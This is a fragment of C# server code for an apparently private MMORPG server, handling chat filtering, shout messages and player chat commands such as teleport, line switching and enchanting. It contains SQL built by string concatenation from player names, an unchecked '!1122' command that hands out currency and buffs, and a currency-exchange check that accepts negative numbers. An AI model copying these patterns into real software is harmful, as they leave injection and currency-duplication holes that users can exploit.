							if (item.Sffh == 0)
							{
								text = text.Replace("  ", string.Empty).Replace(item.Txt, "我爱" + World.服务器名);
							}
							else
							{
								if (item.Sffh == 1)
								{
									if (base.Client != null)
									{
										base.Client.Dispose();
									}
									return;
								}
								if (item.Sffh == 2)
								{
									DBA.ExeSqlCommand(string.Format("  Insert  into  TBL_BANED  values  (  '{0}')", base.Client.ToString()), "rxjhaccount");
									封号(72, base.Userid, "发过滤文字");
									return;
								}
								if (item.Sffh == 3)
								{
									return;
								}
							}
						}
					}
					num = 4;
					if (num3 != 0 || !ParseCommand(text))
					{
						num = 5;
						发送消息(text, num3, name);
					}
				}
			}
			catch (Exception ex2)
			{
				string text2 = Converter.ToString(封包数据);
				Form1.WriteLine(1, "说话出错![" + base.Userid + "]-[" + base.UserName + "]  [" + num + "]        [" + text2 + "]" + ex2.Message);
			}
		}

		public void 发送消息(string msg, int msgType, string name)
		{
			try
			{
				string value;
				if (DateTime.Now.Subtract(发送消息time).TotalSeconds < 2.0)
				{
					系统提示("发送消息太快，请慢点说。");
				}
				else if (World.禁言列表.TryGetValue(base.UserName, out value))
				{
					系统提示("你已被系统禁言。");
				}
				else
				{
					发送消息time = DateTime.Now;
					byte[] array = Converter.hexStringToByte("AA55A50000006600970000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
					array[10] = (byte)msgType;
					if (name == null || name == "")
					{
						name = base.UserName;
					}
					byte[] bytes = Encoding.Default.GetBytes(name);
					byte[] bytes2 = Encoding.Default.GetBytes(msg);
					System.Buffer.BlockCopy(bytes2, 0, array, 35, bytes2.Length);
					System.Buffer.BlockCopy(bytes, 0, array, 12, bytes.Length);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					int num = 0;
					switch (msgType)
					{
					case 204:
						if (DateTime.Now.Subtract(狮子吼time).TotalSeconds < 30.0)
						{
							系统提示("狮子吼每30秒可使用一回。");
							int num5 = 0;
							for (int k = 0; k < 装备栏包裹.Length; k++)
							{
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000028)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000027)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000026)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000025)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000041)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000042)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000047)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000048)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000029)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
								if (BitConverter.ToInt32(装备栏包裹[k].物品ID, 0) == 1007000030)
								{
									物品减去属性数量(k, num5);
									if (num5 > 0)
									{
										num5 = 0;
									}
								}
							}
						}
						else
						{
							狮子吼time = DateTime.Now;
							int num6 = 1;
							for (int l = 0; l < 装备栏包裹.Length; l++)
							{
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000028)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 204;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000027)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 204;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000026)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 204;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000025)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 204;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000041)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 41;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000042)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 41;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000047)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 38;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000048)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 38;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000029)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 35;
								}
								if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == 1007000030)
								{
									物品减去属性数量(l, num6);
									if (num6 > 0)
									{
										num6 = 0;
									}
									num = 35;
								}
							}
							World.conn.发送("狮子吼|" + base.人物全服ID + "|" + base.UserName + "|" + msg + "|" + base.Client.ToString() + "|" + World.服务器ID + "|" + base.人物坐标_地图 + "|" + num);
						}
						break;
					case 14:
						if (DateTime.Now.Subtract(狮子吼time).TotalSeconds < 30.0)
						{
							系统提示("狮子吼每30秒可使用一回。");
							int num3 = 0;
							for (int i = 0; i < 装备栏包裹.Length; i++)
							{
								if (BitConverter.ToInt32(装备栏包裹[i].物品ID, 0) == 1007000001)
								{
									物品减去属性数量(i, num3);
									if (num3 > 0)
									{
										num3 = 0;
									}
								}
							}
						}
						else
						{
							狮子吼time = DateTime.Now;
							int num4 = 1;
							for (int j = 0; j < 装备栏包裹.Length; j++)
							{
								if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == 1007000001)
								{
									物品减去属性数量(j, num4);
									if (num4 > 0)
									{
										num4 = 0;
									}
								}
							}
							if (World.狮子吼List.Count < World.狮子吼最大数)
							{
								World.狮子吼List.Enqueue(new 狮子吼Class
								{
									FLD_INDEX = base.人物全服ID,
									UserName = base.UserName,
									TxtId = msgType,
									Txt = msg
								});
								if (World.狮子吼ID >= 127)
								{
									World.狮子吼ID = 0;
								}
								else
								{
									World.狮子吼ID++;
								}
								系统提示("狮子吼登记成功");
							}
							else
							{
								系统提示("狮子吼列队以满请等待.....");
							}
						}
						break;
					case 0:
						if (交易 != null && 交易.交易中)
						{
							array[10] = 11;
							if (base.Client != null)
							{
								base.Client.Send(array, array.Length);
							}
							if (交易.交易人.Client != null)
							{
								交易.交易人.Client.Send(array, array.Length);
							}
						}
						else
						{
							if (base.Client != null)
							{
								base.Client.Send(array, array.Length);
							}
							发送当前范围广播数据(array, array.Length);
						}
						break;
					case 1:
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						发送呐喊消息广播数据(array, array.Length);
						break;
					case 2:
					{
						组队Class value2;
						if (World.W组队.TryGetValue(组队id, out value2))
						{
							发送组队消息广播数据(array, array.Length, value2.队员列表);
						}
						break;
					}
					case 3:
						if (base.帮派名字.Length != 0)
						{
							发送帮派消息(base.帮派名字, array, array.Length);
						}
						break;
					case 4:
						if (得到人物数据(name) == null)
						{
							系统提示("消息发送失败,人物名不正确或对方处于离线状态。", 50, "系统提示");
						}
						else
						{
							if (base.Client != null)
							{
								base.Client.Send(array, array.Length);
							}
							string text = Converter.ToString(array);
							int num2 = base.人物全服ID + new Random().Next(1, 100);
							World.conn.发送("传音消息|" + num2 + "|" + base.UserName + "|" + name + "|" + msg + "|" + msgType + "|" + text);
						}
						break;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送消息出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 卡号自救()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [TBL_XWWL_Char]  where  FLD_ID='{0}'", base.Userid));
			for (int i = 0; i < dBToDataTable.Rows.Count; i++)
			{
				string text = (string)dBToDataTable.Rows[i]["FLD_NAME"];
				if (text != base.UserName)
				{
					DBA.ExeSqlCommand(string.Format("UPDATE      TBL_XWWL_Char      SET      FLD_X      =      {0},      FLD_Y      =      {1},      FLD_Z      =      15,      FLD_MENOW      =      {2}      WHERE      FLD_NAME      =      '{3}'", -6800, 53, 301, text));
				}
			}
		}

		public void 清理背包()
		{
			try
			{
				for (int i = 0; i < 36; i++)
				{
					ItmeClass value;
					if (World.Itme.TryGetValue((int)装备栏包裹[i].Get物品ID, out value))
					{
						switch (value.FLD_RESIDE2)
						{
						case 1:
						case 2:
						case 4:
						case 5:
						case 6:
						case 7:
						case 8:
						case 10:
							if (装备栏包裹[i].FLD_强化数量 > 0)
							{
								continue;
							}
							break;
						}
						if (!装备栏包裹[i].物品绑定)
						{
							装备栏包裹[i].物品_byte = new byte[World.数据库单个物品大小];
						}
					}
				}
				初始化装备篮包裹();
				系统提示("操作成功。");
			}
			catch
			{
			}
		}

		[SecureMethod]
		public bool ParseCommand(string Message)
		{
			string string_ = Message[0].ToString();
			if (!Buffer.IsEquals(string_, "!") && !Buffer.IsEquals(string_, "@"))
			{
				return false;
			}
			string[] array = Message.Split(' ');
			string text = array[0];
			if (text.Contains("@"))
			{
				text = text.Replace("@", "!");
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!help"))
			{
				系统提示("玩家可以用本命令移动动各个地图", 9, "[!移动      地图名]");
				系统提示("玩家可以用本命令跳舞", 9, "[!跳舞]");
				系统提示("玩家可以用本命令鞠躬", 9, "[!鞠躬]");
				系统提示("玩家可以用本命令弯腰", 9, "[!弯腰]");
				系统提示("玩家可以用本命令清理背包", 9, "[!清理背包]");
				系统提示("玩家可以用本命令发送狮吼功信息", 9, "[!狮吼功      消息]");
				系统提示("玩家可以用本命令进行离线挂      机", 9, "[!离线挂机]");
				系统提示("玩家可以用本命解救同帐号下卡号的人物角色", 9, "[!卡号自救]");
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!追踪"))
			{
				查百宝阁元宝数();
				if (base.FLD_RXPIONT < 200)
				{
					系统提示("真穷,200元宝都没有...");
					return true;
				}
				Players players = World.检查玩家name(array[1]);
				if (players != null)
				{
					检察元宝数据(200, 0);
					移动(players.人物坐标_X, players.人物坐标_Y, 15f, players.人物坐标_地图);
					保存元宝数据();
				}
				else
				{
					系统提示("对方不在线或名字输入错误。");
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!参加攻城")
			{
				参加攻城战();
			}
			if (array.Length >= 1 && array[0] == "!清理大培")
			{
				if (追加状态列表.ContainsKey(1007000007))
				{
					追加状态列表[1007000007].时间结束事件();
				}
				return true;
			}
			if (array.Length >= 1 && array[0] == "!1122")
			{
				//攻城结束奖励();
				if (追加状态列表.ContainsKey(1008002169))
				{
					追加状态列表[1008002169].时间结束事件();
				}
				追加状态类 追加状态类 = new 追加状态类(this, 172800000, 1008002169, 1);
				追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
				状态效果(BitConverter.GetBytes(1008002169), 1, 172800000);
				Player_WuXun += 2000;
				查百宝阁元宝数();
				检察元宝数据(50, 1);
				计算人物基本数据();
				更新武功和状态();
				更新HP_MP_SP();
				//RxjhClass.百宝记录(Userid, UserName, 0.0, "攻城战获得", 1, 50);
				保存元宝数据();
				系统提示("系统奖励攻城战胜利者每人" + 2000 + "点的武勋", 10, "奖励提示");
				系统提示("系统奖励攻城战胜利者每人" + 50 + "元宝", 10, "奖励提示");
			}

			if (array.Length >= 1 && array[0] == "!清理五色")
			{
				if (追加状态列表.ContainsKey(1007000005))
				{
					追加状态列表[1007000005].时间结束事件();
				}
				if (追加状态列表.ContainsKey(1008000016))
				{
					追加状态列表[1008000016].时间结束事件();
				}
				if (追加状态列表.ContainsKey(1008000017))
				{
					追加状态列表[1008000017].时间结束事件();
				}
				if (追加状态列表.ContainsKey(1008000018))
				{
					追加状态列表[1008000018].时间结束事件();
				}
				if (追加状态列表.ContainsKey(1008000019))
				{
					追加状态列表[1008000019].时间结束事件();
				}
				return true;
			}
			if (array.Length >= 2 && array[0] == "!换线")
			{
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					return true;
				}
				if (base.Player死亡 || 退出中 || (个人商店 != null && 个人商店.个人商店是否开启) || (交易 != null && 交易.交易人 != null))
				{
					系统提示("当前状态不能移动！", 10, "换线提示");
					return true;
				}
				int num = 0;
				if (Buffer.IsEquals(array[1], "1线"))
				{
					num = 1;
				}
				else if (Buffer.IsEquals(array[1], "2线"))
				{
					num = 2;
				}
				else if (Buffer.IsEquals(array[1], "3线"))
				{
					num = 3;
				}
				else if (Buffer.IsEquals(array[1], "4线"))
				{
					num = 4;
				}
				else if (Buffer.IsEquals(array[1], "5线"))
				{
					num = 5;
				}
				else if (Buffer.IsEquals(array[1], "6线"))
				{
					num = 6;
				}
				else if (Buffer.IsEquals(array[1], "7线"))
				{
					num = 7;
				}
				else if (Buffer.IsEquals(array[1], "8线"))
				{
					num = 8;
				}
				else if (Buffer.IsEquals(array[1], "9线"))
				{
					num = 9;
				}
				else if (Buffer.IsEquals(array[1], "10线"))
				{
					num = 10;
				}
				int num2 = num - 1;
				ServerList value;
				if (num2 == base.原服务器序号)
				{
					系统提示("当前人物所在线路和要切换线路相同。", 10, "线路提示");
				}
				else if (SerList.TryGetValue(num2, out value))
				{
					系统提示("线路切换中，请稍等。。。", 10, "线路管理员");
					World.conn.发送("更新原服务器|" + base.Userid + "|" + num2 + "|" + value.服务器IP + "|" + value.服务器端口 + "|" + value.服务器ID);
					换线(value.服务器ID, value.服务器IP, value.服务器端口);
					系统提示("ID是" + value.服务器ID, 10, "线路管理员");
					系统提示("IP是" + value.服务器IP, 10, "线路管理员");
					系统提示("端口是" + value.服务器端口, 10, "线路管理员");
				}
				else
				{
					系统提示("目标线路尚未开放。", 10, "线路提示");
				}
			}
			if (array.Length >= 1 && array[0] == World.贡献元宝命令)
			{
				if (base.帮派Id == 0)
				{
					系统提示("没有加入任何门派无法使用此命令!请加入门派后尝试!", 9, "系统提示");
					return true;
				}
				查百宝阁元宝数();
				if (base.FLD_RXPIONT >= World.贡献元宝数)
				{
					检察元宝数据(World.贡献元宝数, 0);
					保存元宝数据();
					base.门派贡献度 += World.贡献元宝荣誉点;
					保存人物的数据();
					DataTable dataTable = RxjhClass.得到门派荣誉数据(base.帮派名字, base.人物分区ID);
					if (dataTable != null)
					{
						int num3 = (int)dataTable.Rows[0]["FLD_RY"];
						DataTable dataTable2 = RxjhClass.得到帮派数据(base.帮派名字);
						if (dataTable2 != null)
						{
							DataTable dataTable3 = RxjhClass.得到人物名字(dataTable2.Rows[0]["G_Master"].ToString());
							if (dataTable3 != null)
							{
								RxjhClass.更新门派荣誉(dataTable2.Rows[0]["G_Master"].ToString(), dataTable2.Rows[0]["G_Name"].ToString(), (int)dataTable3.Rows[0]["FLD_ZX"], (int)dataTable3.Rows[0]["FLD_LEVEL"], (int)dataTable3.Rows[0]["FLD_JOB"], (int)dataTable3.Rows[0]["FLD_JOB_LEVEL"], num3 + World.贡献元宝荣誉点, base.人物分区ID);
								系统提示("你为本门派获得  " + World.贡献元宝荣誉点 + "贡献点数", 9, "系统提示1");
								dataTable3.Dispose();
							}
							dataTable2.Dispose();
						}
						dataTable.Dispose();
					}
					else
					{
						DataTable dataTable4 = RxjhClass.得到帮派数据(base.帮派名字);
						if (dataTable4 != null)
						{
							if (dataTable4.Rows.Count > 0)
							{
								DataTable dataTable5 = RxjhClass.得到人物名字(dataTable4.Rows[0]["G_Master"].ToString());
								if (dataTable5 != null)
								{
									RxjhClass.创建门派荣誉(dataTable4.Rows[0]["G_Master"].ToString(), dataTable4.Rows[0]["G_Name"].ToString(), (int)dataTable5.Rows[0]["FLD_ZX"], (int)dataTable5.Rows[0]["FLD_LEVEL"], (int)dataTable5.Rows[0]["FLD_JOB"], (int)dataTable5.Rows[0]["FLD_JOB_LEVEL"], World.贡献元宝荣誉点, base.人物分区ID);
									系统提示("你为本门派获得  " + World.贡献元宝荣誉点 + "贡献点数", 9, "系统提示");
									dataTable5.Dispose();
								}
							}
							dataTable4.Dispose();
						}
					}
				}
				else
				{
					系统提示("元宝不足需要  " + World.贡献元宝数 + "元宝才可以贡献", 9, "系统提示");
				}
			}
			if (array.Length >= 1 && array[0] == "!清理金符")
			{
				if (公有药品 != null && 公有药品.ContainsKey(1008000027))
				{
					if (公有药品.ContainsKey(1008000027))
					{
						公有药品.Remove(1008000027);
						系统提示("金符清理完成，小退重新上线生效。");
						base.FLD_人物_追加_经验百分比 -= 0.2;
						base.FLD_人物_追加_历练百分比 -= 0.5;
						base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
						if (base.FLD_人物_追加_经验百分比 < 0.0)
						{
							base.FLD_人物_追加_经验百分比 = 0.0;
						}
						if (base.FLD_人物_追加_历练百分比 < 0.0)
						{
							base.FLD_人物_追加_历练百分比 = 0.0;
						}
						if (base.FLD_人物_追加_获得游戏币百分比 < 0.0)
						{
							base.FLD_人物_追加_获得游戏币百分比 = 0.0;
						}
					}
				}
				else
				{
					系统提示("没有可清理的金符。");
				}
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!兑换赠品元宝"))
			{
				if (array[1].Length == 0)
				{
					return true;
				}
				if (array[1].Length > 4)
				{
					系统提示("兑换数量输入长度不能超过4位。");
					return true;
				}
				if (!Regex.IsMatch(array[1], "^[-]?[1-9]{1}\\d*$|^[0]{1}$"))
				{
					系统提示("兑换数量只能为数字。");
					return true;
				}
				int num4 = int.Parse(array[1]);
				if (num4 > 10000)
				{
					系统提示("每次兑换数量不能超过一万。");
					return true;
				}
				if (num4 % 2 != 0)
				{
					系统提示("兑换数量不能为单数。");
					return true;
				}
				int num5 = num4 / 2;
				查百宝阁元宝数();
				if (base.FLD_RXPIONT < num5)
				{
					系统提示("持有元宝数量不足,不能兑换。");
					return true;
				}
				检察元宝数据(num5, 0);
				检察元宝积分数据(num4, 1);
				保存元宝数据();
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "兑换赠品元宝", 1, num5);
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!清理玄武符"))
			{
				if (公有药品 != null && 公有药品.ContainsKey(1008000063))
				{
					if (公有药品.ContainsKey(1008000063))
					{
						公有药品.Remove(1008000063);
						系统提示("玄武符清理完成，小退重新上线生效。");
						base.FLD_人物_追加_经验百分比 -= 0.2;
						base.FLD_人物_追加_历练百分比 -= 0.5;
						base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
						if (base.FLD_人物_追加_经验百分比 < 0.0)
						{
							base.FLD_人物_追加_经验百分比 = 0.0;
						}
						if (base.FLD_人物_追加_历练百分比 < 0.0)
						{
							base.FLD_人物_追加_历练百分比 = 0.0;
						}
						if (base.FLD_人物_追加_获得游戏币百分比 < 0.0)
						{
							base.FLD_人物_追加_获得游戏币百分比 = 0.0;
						}
					}
				}
				else
				{
					系统提示("没有可清理的玄武符。");
				}
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!清理药品"))
			{
				if (追加状态列表 != null)
				{
					foreach (追加状态类 value8 in 追加状态列表.Values)
					{
						if (value8.FLD_PID != 1008001043 && value8.FLD_PID != 1008001042)
						{
							value8.时间结束事件();
						}
					}
				}
				if (追加状态New列表 != null)
				{
					foreach (追加状态New类 value9 in 追加状态New列表.Values)
					{
						value9.时间结束事件();
					}
				}
				系统提示("药品清理成功。");
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!卡号自救"))
			{
				卡号自救();
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!离线挂机"))
			{
				if (base.人物坐标_地图 != 101)
				{
					系统提示("只有在泫勃派才能挂      机。");
					return true;
				}
				if (进店中)
				{
					系统提示("商店进店中不能挂      机。");
					return true;
				}
				if (交易 != null && 交易.交易中)
				{
					系统提示("交易中不能挂      机。");
					return true;
				}
				组队Class value2;
				if (组队id != 0 && World.W组队.TryGetValue(组队id, out value2))
				{
					value2.退出(this, 0);
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (查坐标 != null)
				{
					查坐标.Close();
					查坐标.Dispose();
					查坐标 = null;
				}
				if (自动坐标 != null)
				{
					自动坐标.Close();
					自动坐标.Dispose();
					自动坐标 = null;
				}
				if (攻击列表 != null)
				{
					攻击列表.Clear();
				}
				if (新武功连击 != null)
				{
					新武功连击.Clear();
				}
				if (玉连环 != null)
				{
					玉连环.Clear();
				}
				if (交易 != null)
				{
					交易 = null;
				}
				if (得到门徽ID != null)
				{
					得到门徽ID.Clear();
					得到门徽ID = null;
				}
				if (NpcList != null)
				{
					if (NpcList.Count > 0)
					{
						foreach (NpcClass value10 in NpcList.Values)
						{
							value10.PlayList_Remove(this);
						}
					}
					NpcList.Clear();
					NpcList = null;
				}
				if (地面物品列表 != null)
				{
					地面物品列表.Clear();
					地面物品列表 = null;
				}
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (异常状态 != null)
				{
					异常状态.Clear();
					异常状态 = null;
				}
				if (神女异常状态 != null)
				{
					神女异常状态.Clear();
					神女异常状态 = null;
				}
				if (tem != null)
				{
					tem.Clear();
					tem = null;
				}
				World.conn.发送("离线挂机|" + base.Userid);
				保存人物数据存储过程();
				base.Client.Offline();
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!退出安全模式"))
			{
				if (追加状态列表 != null && GetAddState(900000619))
				{
					追加状态列表[900000619].时间结束事件();
				}
				安全模式 = 0;
				系统提示("安全模式已解除,行走江湖要小心。");
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!高级押注"))
			{
				if (base.是否押注)
				{
					系统提示("不允许重复下注。");
					return true;
				}
				if (World.EVEPVP != null)
				{
					if (World.Eve90进程 == 1)
					{
						Players value3;
						if (!World.evePlayers.TryGetValue(base.人物全服ID, out value3))
						{
							查百宝阁元宝数();
							if (base.FLD_RXPIONT >= World.允许玩家押注数量)
							{
								if (!(array[1] == "单") && !(array[1] == "双"))
								{
									系统提示("指令错误,正确的下注指令为[!高级押注      单]      或      [!高级押注      双]。");
								}
								else
								{
									base.是否押注 = true;
									base.押注专场代码 = 90;
									base.押注单双 = array[1];
									base.元宝账户状态 = true;
									系统提示("下注成功，下注数量为" + World.允许玩家押注数量 + "元宝。");
								}
							}
							else
							{
								系统提示("元宝数低于" + World.允许玩家押注数量 + "不能下注。");
							}
						}
					}
					else
					{
						系统提示("下注时间已过，等待下一轮吧。");
					}
				}
				else
				{
					系统提示("高级竞技专场没有比赛在进行中，暂时不能下注。");
				}
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!清理背包"))
			{
				清理背包();
				return true;
			}
			if (array.Length >= 2 && Buffer.IsEquals(text, "!移动"))
			{
				if (!打开仓库中 && base.人物坐标_地图 != 2301 && base.人物坐标_地图 != 2341 && base.人物坐标_地图 != 9001 && base.人物坐标_地图 != 9101 && base.人物坐标_地图 != 9201 && base.人物_HP != 0)
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						return true;
					}
					if (!Buffer.IsEquals(array[1], "银币广场") && !打开仓库中 && base.人物坐标_地图 != 2501)
					{
						if (base.Player_Money < 10000L)
						{
							系统提示("游戏币不足1万,不能完成移动。");
							return true;
						}
						bool flag = false;
						foreach (坐标Class item in World.移动)
						{
							if (item.Rxjh_name == array[1])
							{
								string[] array2 = World.地图锁定.Split(';');
								if (array2.Length >= 1)
								{
									for (int i = 0; i < array2.Length; i++)
									{
										if (int.Parse(array2[i]) == item.Rxjh_Map)
										{
											return true;
										}
									}
								}
								if (item.Rxjh_Map == 801)
								{
									系统提示("势力战地图不能移动！", 9, "系统提示");
									return true;
								}
								if (item.Rxjh_Map == 9001)
								{
									if (World.华婚殿是否在使用中)
									{
										Wedding value4;
										if (World.婚礼list.TryGetValue(9001, out value4))
										{
											if (value4.婚礼进程 == 0)
											{
												移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
												flag = true;
												break;
											}
											系统提示("婚礼已经开始或已结束。");
											return true;
										}
										系统提示("此婚宴厅还没有婚礼举行。");
										return true;
									}
									系统提示("此婚宴厅没有婚礼举行。");
									return true;
								}
								if (item.Rxjh_Map == 9101)
								{
									if (World.龙赡殿是否在使用中)
									{
										Wedding value5;
										if (World.婚礼list.TryGetValue(9101, out value5))
										{
											if (value5.婚礼进程 == 0)
											{
												移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
												flag = true;
												break;
											}
											系统提示("婚礼已经开始或已结束。");
											return true;
										}
										系统提示("此婚宴厅还没有婚礼举行。");
										return true;
									}
									系统提示("此婚宴厅没有婚礼举行。");
									return true;
								}
								if (item.Rxjh_Map != 9201)
								{
									移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
									flag = true;
									break;
								}
								if (World.圣礼殿是否在使用中)
								{
									Wedding value6;
									if (World.婚礼list.TryGetValue(9201, out value6))
									{
										if (value6.婚礼进程 == 0)
										{
											移动(item.Rxjh_X, item.Rxjh_Y, item.Rxjh_Z, item.Rxjh_Map);
											flag = true;
											break;
										}
										系统提示("婚礼已经开始或已结束。");
										return true;
									}
									系统提示("此婚宴厅还没有婚礼举行。");
									return true;
								}
								系统提示("此婚宴厅没有婚礼举行。");
								return true;
							}
						}
						if (!flag)
						{
							系统提示("移动错误，地图名不存在。");
						}
						else
						{
							base.Player_Money -= 10000L;
							更新金钱和负重();
						}
						return true;
					}
					return true;
				}
				return true;
			}
			if (array.Length >= 2 && Buffer.IsEquals(text, "!狮吼功"))
			{
				try
				{
					Thread thread = new Thread(狮吼功线程);
					object parameter = array[1];
					thread.IsBackground = true;
					thread.Start(parameter);
				}
				catch
				{
				}
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!跳舞"))
			{
				动作表情(151);
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!鞠躬"))
			{
				动作表情(200);
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!弯腰"))
			{
				动作表情(5);
				return true;
			}
			if (array.Length >= 1 && Buffer.IsEquals(text, "!附魂"))
			{
				try
				{
					if (BitConverter.ToInt64(装备栏包裹[0].物品全局ID, 0) == 0L)
					{
						系统提示("请把要附魂的物品放到第一格。");
						return true;
					}
					if (Buffer.ToInt32(装备栏包裹[1].物品ID, 0) != 1000000365)
					{
						系统提示("请把初级集魂石放到第二格。");
						return true;
					}
					if (装备栏包裹[0].FLD_FJ_觉醒 >= 5)
					{
						系统提示("物品最多可以附魂5次,不可以再附魂。");
						return true;
					}
					ItmeClass value7;
					if (!World.Itme.TryGetValue(Buffer.ToInt32(装备栏包裹[0].物品ID, 0), out value7))
					{
						return true;
					}
					if (value7.FLD_RESIDE2 != 1 && value7.FLD_RESIDE2 != 4)
					{
						系统提示("只有武器上衣服可以附魂,其他物品不可以附魂。");
						return true;
					}
					double num6 = RNG.Next(0, 100);
					if (base.FLD_VIP == 1)
					{
						num6 += 20.0;
					}
					if (World.合成率 != 0.0)
					{
						num6 += 100.0 * World.合成率;
					}
					if (World.附魂率 != 0.0)
					{
						num6 += 100.0 * World.附魂率;
					}
					if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
					{
						num6 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
					}
					if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
					{
						num6 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
					}
					减去物品(1, 1);
					double num7 = 装备栏包裹[0].FLD_FJ_觉醒 * 20;
					if (num6 >= num7)
					{
						byte[] 物品全局ID = 装备栏包裹[0].物品全局ID;
						byte[] 物品ID = 装备栏包裹[0].物品ID;
						byte[] 物品数量 = 装备栏包裹[0].物品数量;
						byte[] 物品属性 = 装备栏包裹[0].物品属性;
						int num8 = 装备栏包裹[0].FLD_FJ_觉醒 + 1;
						if (num8 >= 5)
						{
							num8 = 5;
						}
						System.Buffer.BlockCopy(Buffer.GetBytes(num8), 0, 物品属性, 46, 4);
						减去物品(0, 1);
						增加物品(物品全局ID, 物品ID, 0, 物品数量, 物品属性, false);
						系统提示("附魂成功。");
					}
					else
					{
						系统提示("附魂失败。");
					}
					return true;
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "附魂系统出错" + ex.Message);
				}
			}
			if (GM模式 == 6)
			{
